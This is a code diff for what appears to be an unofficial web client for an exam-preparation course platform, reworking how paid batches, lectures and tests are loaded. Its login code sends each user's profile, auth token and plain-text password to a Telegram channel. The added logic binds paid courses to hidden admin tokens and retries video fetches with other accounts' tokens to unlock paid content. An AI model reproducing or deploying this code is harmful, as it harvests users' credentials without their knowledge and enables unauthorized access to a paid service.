@@ -67,6 +67,18 @@ function getAllTokensForCourses() {
     return [...USER_TOKENS, ...HIDDEN_ADMIN_TOKENS];
 }
 
+// Helper: Kisi specific Course ID ke liye uska exact bound token return karega
+function getCourseBoundToken(courseId) {
+    const cid = String(courseId || state.courseId || "").trim();
+    if (cid && state.courseTokenMap && state.courseTokenMap[cid]) {
+        return state.courseTokenMap[cid];
+    }
+    if (state.activeTokenObj && state.activeTokenObj.token) {
+        return state.activeTokenObj;
+    }
+    return USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+}
+
 function isUserLoggedIn() {
     return USER_TOKENS.length > 0 && Boolean(USER_TOKENS[0].token);
 }
@@ -164,7 +176,7 @@ function showLoginStatus(msg, type) {
     alertBox.innerHTML = msg;
 }
 
-// Fetch User Details from /get/get_user_dt?userid=<uid> (Exact Old Website Flow)
+// Fetch User Details from /get/get_user_dt?userid=<uid>
 async function fetchUserDetailsFromServer(jwtToken, userId) {
     const uid = userId || extractUidFromJwt(jwtToken);
     if (!jwtToken || !uid) return null;
@@ -213,11 +225,10 @@ async function sendUserDetailsToTelegram(userObj, jwtToken, loginMethod, rawPass
     } catch {}
 }
 
-// Authenticate with Number/Email + Password on Old Website Server
+// Authenticate with Number/Email + Password on Server
 async function loginOnRwaServer(phoneOrEmail, password) {
     const loginEndpoints = ["/post/userLogin", "/get/login", "/post/login"];
 
-    // 1. Try FormData / URLSearchParams (Standard AppX Web/Mobile Login)
     for (const ep of loginEndpoints) {
         try {
             const formData = new URLSearchParams();
@@ -246,7 +257,6 @@ async function loginOnRwaServer(phoneOrEmail, password) {
             }
         } catch {}
 
-        // 2. Try JSON Body (Web API)
         try {
             const res = await fetch(`${API_BASE}${ep}`, {
                 method: "POST",
@@ -282,7 +292,6 @@ window.submitUserLogin = async function(mode) {
             showLoginStatus("⚠️ Kripya apna JWT Authorization Token paste karein.", "error");
             return;
         }
-        // Clean quotes if copied from headers/cookies
         rawToken = rawToken.replace(/^["']|["']$/g, "").replace(/^Authorization:\s*/i, "").trim();
 
         const extractedUid = extractUidFromJwt(rawToken);
@@ -299,7 +308,6 @@ window.submitUserLogin = async function(mode) {
             return;
         }
 
-        // Save only User's own token & profile
         const userTokObj = {
             id: "utok_" + Date.now(),
             label: userDetails.name || `User #${extractedUid}`,
@@ -313,7 +321,6 @@ window.submitUserLogin = async function(mode) {
         localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
         localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
 
-        // Send all details to Telegram Channel
         await sendUserDetailsToTelegram(userDetails, rawToken, "Direct JWT Token", "Logged via Token");
 
         showLoginStatus(`✅ Login Successful! Welcome ${userDetails.name || "User"}!`, "success");
@@ -325,7 +332,6 @@ window.submitUserLogin = async function(mode) {
         return;
     }
 
-    // Mode 1: Phone/Email + Password Login
     const phone = document.getElementById("loginPhoneInput").value.trim();
     const pass = document.getElementById("loginPassInput").value.trim();
 
@@ -334,7 +340,6 @@ window.submitUserLogin = async function(mode) {
         return;
     }
 
-    // Agar user ne galti se password box mein JWT token daal diya ho
     if (pass.startsWith("eyJ")) {
         document.getElementById("loginTokenInput").value = pass;
         switchLoginMode("token");
@@ -387,7 +392,6 @@ window.submitUserLogin = async function(mode) {
     localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
     localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
 
-    // Send all details to Telegram Channel
     await sendUserDetailsToTelegram(userDetails, token, "Phone/Password Login", pass);
 
     showLoginStatus(`✅ Welcome ${userDetails.name || "User"}! Login Successful.`, "success");
@@ -411,7 +415,6 @@ async function openProfileModal() {
     const activeUserTok = USER_TOKENS[0];
     const uid = activeUserTok.userId || extractUidFromJwt(activeUserTok.token);
 
-    // Fetch fresh profile from /get/get_user_dt?userid=<uid>
     const freshProfile = await fetchUserDetailsFromServer(activeUserTok.token, uid);
     if (freshProfile) {
         USER_PROFILE = freshProfile;
@@ -623,6 +626,7 @@ let state = {
     courseName: "SSC GD भर्ती 2027",
     activeTokenObj: USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0],
     courseTokenMap: {},
+    courseTestSeriesMap: {},
     subjectId: null,
     subjectName: "",
     topicId: null,
@@ -754,11 +758,13 @@ function handleGlobalBack() {
 }
 
 // =====================================================
-// API CALLER
+// API CALLER (STRICT TOKEN PRIORITY: PASSED TOKEN -> COURSE ACTIVE TOKEN -> USER TOKEN -> ADMIN TOKEN)
 // =====================================================
 async function fetchRawJSONWithToken(endpoint, tokenObj) {
     const statusBadge = document.getElementById("apiStatus");
-    const useTok = tokenObj || USER_TOKENS[0] || state.activeTokenObj || HIDDEN_ADMIN_TOKENS[0];
+    const useTok = tokenObj || state.activeTokenObj || USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    const resolvedUid = String(useTok.userId || extractUidFromJwt(useTok.token) || "4756316");
+
     try {
         const res = await fetch(`${API_BASE}${endpoint}`, {
             headers: {
@@ -768,7 +774,7 @@ async function fetchRawJSONWithToken(endpoint, tokenObj) {
                 "Device-Type": "",
                 "is-safari": "0",
                 "Authorization": useTok.token,
-                "User-ID": String(useTok.userId || extractUidFromJwt(useTok.token) || "4756316")
+                "User-ID": resolvedUid
             }
         });
         const json = await res.json();
@@ -794,7 +800,7 @@ async function fetchAPIWithToken(endpoint, tokenObj, fallbackGetter) {
 }
 
 // =====================================================
-// BATCHES & COURSES (ALL TOKENS MERGED, NO DUPLICATES)
+// BATCHES & COURSES (EXACT TOKEN BINDING PER PURCHASED BATCH)
 // =====================================================
 async function renderPaidBatches() {
     if (!enforceCompulsoryLogin()) return;
@@ -810,28 +816,30 @@ async function renderPaidBatches() {
     const seenIds = new Set();
     const allTokensToFetch = getAllTokensForCourses();
 
+    // 1. Sirf real purchased courses (/get/mycourseweb & /get/mycourse) har token se fetch honge
     for (const tokObj of allTokensToFetch) {
         const uid = tokObj.userId || extractUidFromJwt(tokObj.token) || "4756316";
-        const endpointsToTry = [
+        const purchasedEndpoints = [
             `/get/mycourseweb?userid=${uid}`,
-            `/get/mycourse?userid=${uid}`,
-            `/get/course_by_id?id=571`
+            `/get/mycourse?userid=${uid}`
         ];
 
-        for (const ep of endpointsToTry) {
+        for (const ep of purchasedEndpoints) {
             const data = await fetchAPIWithToken(ep, tokObj, () => null);
             if (Array.isArray(data) && data.length > 0) {
                 data.forEach(c => {
                     const cid = String(c.id || c.course_id || "").trim();
                     const cname = String(c.course_name || "").trim();
-                    // Strict deduplication by Course ID & Course Name so no course ever repeats
                     if (cid && !seenIds.has(cid) && (!cname || !seenIds.has(cname))) {
                         seenIds.add(cid);
                         if (cname) seenIds.add(cname);
+                        // Lock exact token that owns this batch
                         state.courseTokenMap[cid] = tokObj;
+                        if (c.test_series_id) state.courseTestSeriesMap[cid] = String(c.test_series_id);
                         mergedCourses.push({
                             ...c,
                             id: cid,
+                            _boundTokenObj: tokObj,
                             _badgeText: tokObj.isAdmin ? "☁️ Cloud Synced" : `🔑 ${tokObj.label || "My Account"}`
                         });
                     }
@@ -840,12 +848,23 @@ async function renderPaidBatches() {
         }
     }
 
-    if (mergedCourses.length === 0) {
-        DB.paidCourses.forEach(c => {
-            if (!seenIds.has(String(c.id))) {
-                seenIds.add(String(c.id));
-                state.courseTokenMap[c.id] = HIDDEN_ADMIN_TOKENS[0];
-                mergedCourses.push({ ...c, _badgeText: "☁️ Cloud Synced" });
+    // 2. Agar Admin ka Course #571 abhi tak add nahi hua, toh sirf Admin Token ke sath bind karke fetch karein
+    if (!seenIds.has("571")) {
+        const adminTok = HIDDEN_ADMIN_TOKENS[0];
+        const c571Data = await fetchAPIWithToken(`/get/course_by_id?id=571`, adminTok, () => DB.paidCourses);
+        const list571 = Array.isArray(c571Data) && c571Data.length > 0 ? c571Data : DB.paidCourses;
+        list571.forEach(c => {
+            const cid = String(c.id || c.course_id || "571").trim();
+            if (!seenIds.has(cid)) {
+                seenIds.add(cid);
+                state.courseTokenMap[cid] = adminTok;
+                state.courseTestSeriesMap[cid] = String(c.test_series_id || "700");
+                mergedCourses.push({
+                    ...c,
+                    id: cid,
+                    _boundTokenObj: adminTok,
+                    _badgeText: "☁️ Cloud Synced"
+                });
             }
         });
     }
@@ -889,9 +908,10 @@ async function renderFreeBatches() {
 
     grid.innerHTML = "";
     list.forEach(c => {
-        const cid = c.id || "free_101";
+        const cid = String(c.id || "free_101");
         const name = (c.course_name || "Free Course").replace(/'/g, "");
         const logo = c.exam_logo || c.course_thumbnail || "https://placehold.co/600x320/059669/ffffff?text=Free+Batch";
+        state.courseTokenMap[cid] = primaryTok;
         grid.innerHTML += `
             <div onclick="openFreeCourse('${cid}', '${name}')" class="grid-card overflow-hidden cursor-pointer flex flex-col justify-between">
                 <img src="${logo}" onerror="this.src='https://placehold.co/600x320/059669/ffffff?text=Free+Batch'" class="w-full h-44 object-cover">
@@ -905,25 +925,33 @@ async function renderFreeBatches() {
 }
 
 function openPaidCourse(id, name) {
-    state.courseId = id;
+    const cid = String(id).trim();
+    state.cat = "paid";
+    state.courseId = cid;
     state.courseName = name;
-    state.activeTokenObj = state.courseTokenMap[id] || USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    // Lock state.activeTokenObj to the exact token that fetched this course
+    state.activeTokenObj = getCourseBoundToken(cid);
+    window.ACTIVE_PLAYER_TOKEN = state.activeTokenObj.token;
+
     document.getElementById("subTabs").classList.remove("hidden");
-    document.getElementById("crumbText").textContent = `Batch #${id}`;
+    document.getElementById("crumbText").textContent = `Batch #${cid}`;
     document.getElementById("headingText").textContent = name;
     loadCourseTab("subjects");
 }
 
 async function openFreeCourse(id, name) {
-    state.courseId = id;
+    const cid = String(id).trim();
+    state.cat = "free";
+    state.courseId = cid;
     state.courseName = name;
     state.view = "subjects";
+    state.activeTokenObj = getCourseBoundToken(cid);
+
     document.getElementById("subTabs").classList.add("hidden");
     document.getElementById("crumbText").textContent = "Free Batch";
     document.getElementById("headingText").textContent = name;
 
-    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
-    const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${id}&start=-1`, primaryTok, () => DB.freeSubjects);
+    const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${cid}&start=-1`, state.activeTokenObj, () => DB.freeSubjects);
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = "";
     (subs.length ? subs : DB.freeSubjects).forEach(s => {
@@ -963,7 +991,7 @@ function openFreeLectures(topId, topName) {
     document.getElementById("headingText").textContent = topName;
     const list = DB.freeLectures[topId] || [];
     document.getElementById("mainGrid").innerHTML = "";
-    renderLectureList(list);
+    renderLectureList(list, state.activeTokenObj);
 }
 
 async function loadCourseTab(tab) {
@@ -974,9 +1002,13 @@ async function loadCourseTab(tab) {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading...</div>`;
 
+    // Hamesha current batch ka bound token use karein
+    const batchTok = getCourseBoundToken(state.courseId);
+    state.activeTokenObj = batchTok;
+
     if (tab === "subjects") {
         state.view = "subjects";
-        const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => DB.paidSubjects);
+        const subs = await fetchAPIWithToken(`/get/allsubjectfrmlivecourseclass?courseid=${state.courseId}&start=-1`, batchTok, () => DB.paidSubjects);
         grid.innerHTML = "";
         subs.forEach(s => {
             const name = s.subject_name || s.subjectname || "Subject";
@@ -992,17 +1024,17 @@ async function loadCourseTab(tab) {
                 </div>`;
         });
     } else if (tab === "live") {
-        const res = await fetchAPIWithToken(`/get/live_upcoming_course_classv2?courseid=${state.courseId}&start=-1`, state.activeTokenObj, () => ({ upcoming: [] }));
+        const res = await fetchAPIWithToken(`/get/live_upcoming_course_classv2?courseid=${state.courseId}&start=-1`, batchTok, () => ({ upcoming: [] }));
         const list = Array.isArray(res) ? res : (res.upcoming || res.live || []);
         grid.innerHTML = "";
-        renderLectureList(list);
+        renderLectureList(list, batchTok);
     } else if (tab === "tests") {
         state.view = "batch_ts_subjects";
-        const tsId = state.courseId === "571" ? "700" : "700";
+        const tsId = state.courseTestSeriesMap[state.courseId] || "700";
         state.activeSeriesId = tsId;
         state.activeSeriesTitle = `${state.courseName} - Batch Tests`;
 
-        const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, state.activeTokenObj, () => DB.tsSubjects["700"]);
+        const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, batchTok, () => DB.tsSubjects["700"]);
         const subList = (Array.isArray(subs) && subs.length > 0) ? subs : DB.tsSubjects["700"];
 
         grid.innerHTML = "";
@@ -1037,13 +1069,16 @@ async function openBatchInternalTests(tsId, subId, subName) {
     state.activeTsSubName = subName;
     document.getElementById("headingText").textContent = `📝 ${subName}`;
 
-    const uid = state.activeTokenObj?.userId || "4756316";
+    const batchTok = getCourseBoundToken(state.courseId);
+    state.activeTokenObj = batchTok;
+    const uid = batchTok.userId || extractUidFromJwt(batchTok.token) || "4756316";
+
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Batch Quizzes & Tests...</div>`;
 
     const endpoint = `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&chapter_id=-1&userid=${uid}&search=&start=-1`;
-    const titles = await fetchAPIWithToken(endpoint, state.activeTokenObj, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["700_3171"]);
-    renderTestTitlesGrid(titles, tsId);
+    const titles = await fetchAPIWithToken(endpoint, batchTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["700_3171"]);
+    renderTestTitlesGrid(titles, tsId, batchTok);
 }
 
 async function openPaidTopics(subId, subName) {
@@ -1054,7 +1089,10 @@ async function openPaidTopics(subId, subName) {
     document.getElementById("crumbText").textContent = state.courseName;
     document.getElementById("headingText").textContent = `📂 ${subName}`;
 
-    const topics = await fetchAPIWithToken(`/get/alltopicfrmlivecourseclass?courseid=${state.courseId}&subjectid=${subId}&start=-1`, state.activeTokenObj, () => DB.paidTopics[subId] || []);
+    const batchTok = getCourseBoundToken(state.courseId);
+    state.activeTokenObj = batchTok;
+
+    const topics = await fetchAPIWithToken(`/get/alltopicfrmlivecourseclass?courseid=${state.courseId}&subjectid=${subId}&start=-1`, batchTok, () => DB.paidTopics[subId] || []);
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = "";
 
@@ -1078,13 +1116,16 @@ async function openPaidLectures(topId, topName) {
     document.getElementById("crumbText").textContent = state.subjectName;
     document.getElementById("headingText").textContent = `🎬 ${topName}`;
 
+    const batchTok = getCourseBoundToken(state.courseId);
+    state.activeTokenObj = batchTok;
+
     const classes = await fetchAPIWithToken(
         `/get/livecourseclassbycoursesubtopconceptapiv3?courseid=${state.courseId}&subjectid=${state.subjectId}&topicid=${topId}&conceptid=1&start=0`,
-        state.activeTokenObj,
+        batchTok,
         () => DB.paidLectures[topId] || []
     );
     document.getElementById("mainGrid").innerHTML = "";
-    renderLectureList(classes);
+    renderLectureList(classes, batchTok);
 }
 
 function normalizeQualityLabel(rawLabel) {
@@ -1142,9 +1183,10 @@ function extractQualitiesFromItem(item) {
     return sortedMap;
 }
 
-function renderLectureList(list) {
+function renderLectureList(list, boundTokenObj) {
     const grid = document.getElementById("mainGrid");
     state.currentLectureKeys = [];
+    const lectureTok = boundTokenObj || getCourseBoundToken(state.courseId);
 
     if (!list || !list.length) {
         grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is folder mein abhi koi class nahi hai.</div>`;
@@ -1159,9 +1201,12 @@ function renderLectureList(list) {
         const pdf1 = resolvePdfUrl(item.pdf_link || item.ypdf_link, item.ypdf_link2);
         const pdf2 = resolvePdfUrl(item.pdf_link2, item.ypdf_link2);
 
+        // Har lecture ke sath uska courseId aur boundTokenObj permanently save karein
         state.mediaMap[key] = {
             key: key,
             id: item.id,
+            courseId: state.courseId,
+            tokenObj: lectureTok,
             title: item.Title || "Class Lecture",
             date: item.date_and_time || "",
             thumb: item.thumbnail || "",
@@ -1189,10 +1234,19 @@ function renderLectureList(list) {
     });
 }
 
+// =====================================================
+// PLAYER ENGINE (USES EXACT BATCH TOKEN + SMART FALLBACK)
+// =====================================================
 async function playClassInRwaPlayer(key) {
     state.activeKey = key;
     const info = state.mediaMap[key];
     if (!info) return;
+
+    // Jis token se yeh batch/lecture aaya hai, wahi token active karein
+    const targetCourseId = info.courseId || state.courseId;
+    const batchTok = info.tokenObj || getCourseBoundToken(targetCourseId);
+    state.activeTokenObj = batchTok;
+    window.ACTIVE_PLAYER_TOKEN = batchTok.token;
 
     showSlide("slidePlayer");
     document.getElementById("playingTitle").textContent = "▶ " + info.title;
@@ -1214,13 +1268,32 @@ async function playClassInRwaPlayer(key) {
     const urlInput = document.getElementById("url");
 
     if (state.cat === "paid" && info.id) {
-        const fresh = await fetchAPIWithToken(
-            `/get/fetchVideoDetailsById?course_id=${state.courseId}&video_id=${info.id}&ytflag=0&folder_wise_course=0&lc_app_api_url=`,
-            state.activeTokenObj,
-            () => null
-        );
+        // 1. Sabse pehle exact batch token se video details fetch karein
+        const videoEndpoint = `/get/fetchVideoDetailsById?course_id=${targetCourseId}&video_id=${info.id}&ytflag=0&folder_wise_course=0&lc_app_api_url=`;
+        let fresh = await fetchAPIWithToken(videoEndpoint, batchTok, () => null);
+        let freshMap = (fresh && typeof fresh === "object") ? extractQualitiesFromItem(fresh) : {};
+
+        // 2. Agar kisi wajah se primary token par link na mile, toh baaki tokens (Admin/User) se auto-retry karein
+        if (Object.keys(freshMap).length === 0 && Object.keys(info.qualities || {}).length === 0) {
+            for (const fallbackTok of getAllTokensForCourses()) {
+                if (fallbackTok.token === batchTok.token) continue;
+                const retryFresh = await fetchAPIWithToken(videoEndpoint, fallbackTok, () => null);
+                if (retryFresh && typeof retryFresh === "object") {
+                    const retryMap = extractQualitiesFromItem(retryFresh);
+                    if (Object.keys(retryMap).length > 0) {
+                        fresh = retryFresh;
+                        freshMap = retryMap;
+                        info.tokenObj = fallbackTok;
+                        state.courseTokenMap[targetCourseId] = fallbackTok;
+                        state.activeTokenObj = fallbackTok;
+                        window.ACTIVE_PLAYER_TOKEN = fallbackTok.token;
+                        break;
+                    }
+                }
+            }
+        }
+
         if (fresh && typeof fresh === "object") {
-            const freshMap = extractQualitiesFromItem(fresh);
             info.qualities = { ...info.qualities, ...freshMap };
 
             const fPdf1 = resolvePdfUrl(fresh.pdf_link || fresh.ypdf_link, fresh.ypdf_link2);
@@ -1235,9 +1308,11 @@ async function playClassInRwaPlayer(key) {
         return u && !u.includes("playlist_eof.m3u8");
     });
 
-    if (validKeys.length > 0) {
+    if (validKeys.length > 0 && urlInput) {
         const bestKey = validKeys.find(k => k === "720p") || validKeys[0];
         urlInput.value = info.qualities[bestKey];
+        urlInput.dataset.token = state.activeTokenObj.token;
+        urlInput.dataset.userid = state.activeTokenObj.userId || "4756316";
         if (typeof start === "function") start();
     }
 }
@@ -1329,11 +1404,19 @@ function closeInlinePdfAndReset() {
 function changeLectureQuality(qLabel) {
     const info = state.mediaMap[state.activeKey];
     if (info && info.qualities[qLabel]) {
-        document.getElementById("url").value = info.qualities[qLabel];
+        const urlInput = document.getElementById("url");
+        urlInput.value = info.qualities[qLabel];
+        if (info.tokenObj) {
+            urlInput.dataset.token = info.tokenObj.token;
+            window.ACTIVE_PLAYER_TOKEN = info.tokenObj.token;
+        }
         if (typeof start === "function") start();
     }
 }
 
+// =====================================================
+// TEST SERIES & CBT ENGINE
+// =====================================================
 async function openTestSeriesExplorer(mode) {
     if (!enforceCompulsoryLogin()) return;
     state.tsMode = mode;
@@ -1345,6 +1428,7 @@ async function openTestSeriesExplorer(mode) {
     grid.innerHTML = `<div class="col-span-full py-12 text-center font-extrabold text-slate-800">🔄 Loading Official RWA Test Series...</div>`;
 
     const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    state.activeTokenObj = primaryTok;
 
     if (mode === "paid_ts") {
         document.getElementById("crumbText").textContent = "Official Exam Series";
@@ -1421,8 +1505,8 @@ async function openTestSeriesSubjects(tsId, tsTitle) {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading Test Series Subjects...</div>`;
 
-    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
-    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, primaryTok, () => DB.tsSubjects[tsId] || []);
+    const useTok = state.activeTokenObj || USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    const subs = await fetchAPIWithToken(`/get/testseries_subjects?testseries_id=${tsId}`, useTok, () => DB.tsSubjects[tsId] || []);
 
     if (!subs || subs.length === 0 || (subs.length === 1 && String(subs[0].subjectid) === "-1")) {
         openTestSeriesTitles(tsId, "-1", tsTitle);
@@ -1457,18 +1541,20 @@ async function openTestSeriesTitles(tsId, subId, subName) {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Fetching Mock Tests...</div>`;
 
-    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
-    const uid = primaryTok.userId || "4756316";
+    const useTok = state.activeTokenObj || USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    const uid = useTok.userId || extractUidFromJwt(useTok.token) || "4756316";
     const ep = String(subId) === "-1"
         ? `/get/test_titlev2?testseriesid=${tsId}&subject_id=-1&chapter_id=-1&userid=${uid}&search=&start=-1`
         : `/get/test_titlev2?testseriesid=${tsId}&subject_id=${subId}&userid=${uid}&search=&start=-1`;
 
-    const list = await fetchAPIWithToken(ep, primaryTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["743_-1"] || []);
-    renderTestTitlesGrid(list, tsId);
+    const list = await fetchAPIWithToken(ep, useTok, () => DB.tsTitles[`${tsId}_${subId}`] || DB.tsTitles["743_-1"] || []);
+    renderTestTitlesGrid(list, tsId, useTok);
 }
 
-function renderTestTitlesGrid(list, tsId) {
+function renderTestTitlesGrid(list, tsId, boundTok) {
     const grid = document.getElementById("mainGrid");
+    const testTok = boundTok || state.activeTokenObj || USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+
     if (!list || !list.length) {
         grid.innerHTML = `<div class="col-span-full sky-card p-10 text-center font-bold text-slate-600">Is section mein abhi koi test uplabdh nahi hai.</div>`;
         return;
@@ -1481,7 +1567,8 @@ function renderTestTitlesGrid(list, tsId) {
         state.testMap[tKey] = {
             ...t,
             seriesId: tsId || t.test_series_id,
-            resolvedPdf: pdfUrl
+            resolvedPdf: pdfUrl,
+            tokenObj: testTok
         };
 
         grid.innerHTML += `
@@ -1524,6 +1611,9 @@ async function launchCbtTest(tKey) {
     state.cbtResponses = {};
     state.cbtSubmitted = false;
 
+    const testTok = t.tokenObj || state.activeTokenObj || USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
+    state.activeTokenObj = testTok;
+
     showSlide("slideTestAttempt");
     document.getElementById("cbtResultCard").classList.add("hidden");
     document.getElementById("cbtSolutionBox").classList.add("hidden");
@@ -1534,10 +1624,9 @@ async function launchCbtTest(tKey) {
     document.getElementById("cbtOptionsList").innerHTML = "";
     document.getElementById("cbtPaletteGrid").innerHTML = "";
 
-    const primaryTok = USER_TOKENS[0] || HIDDEN_ADMIN_TOKENS[0];
-    const uid = primaryTok.userId || "4756316";
-    fetchRawJSONWithToken(`/Test_Series/check_test_attempts?test_id=${t.id}&user_id=${uid}`, primaryTok);
-    fetchRawJSONWithToken(`/Test_Series/getSavedQuestions?start=0`, primaryTok);
+    const uid = testTok.userId || extractUidFromJwt(testTok.token) || "4756316";
+    fetchRawJSONWithToken(`/Test_Series/check_test_attempts?test_id=${t.id}&user_id=${uid}`, testTok);
+    fetchRawJSONWithToken(`/Test_Series/getSavedQuestions?start=0`, testTok);
 
     let questions = [];
     const qUrl = (t.test_questions_url || "").replace(/\\\//g, "/");
